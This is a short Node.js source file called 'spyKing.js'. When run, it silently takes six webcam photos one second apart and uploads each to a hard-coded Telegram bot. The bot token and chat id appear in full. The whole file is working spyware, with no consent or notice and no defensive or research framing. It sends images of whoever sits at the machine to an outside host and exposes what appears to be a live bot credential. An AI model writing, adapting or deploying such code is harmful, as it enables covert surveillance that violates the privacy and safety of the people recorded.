// spyKing.js
const NodeWebcam = require("node-webcam");
const fetch = require("node-fetch");
const fs = require("fs");

// Telegram info
const telegramBotToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70";
const chatId = "8182050140";

// Webcam options
const opts = {
    width: 640,
    height: 480,
    quality: 100,
    saveShots: true,
    output: "jpeg",
    device: false,
    callbackReturn: "location",
    verbose: false
};

// Create webcam instance
const Webcam = NodeWebcam.create(opts);

// Function to send photo to Telegram
async function sendPhoto(filePath) {
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", fs.createReadStream(filePath));

    const res = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
        method: "POST",
        body: formData
    });

    console.log(await res.json());
}

// Capture 6 images at 1 sec interval
async function captureLoop() {
    for (let i = 0; i < 6; i++) {
        const fileName = `capture_${i}.jpg`;
        NodeWebcam.capture(fileName, opts, async function(err, data) {
            if (err) {
                console.error(err);
            } else {
                console.log(`Captured ${fileName}`);
                await sendPhoto(fileName);
            }
        });
        await new Promise(r => setTimeout(r, 1000)); // 1 sec delay
    }
}

captureLoop();
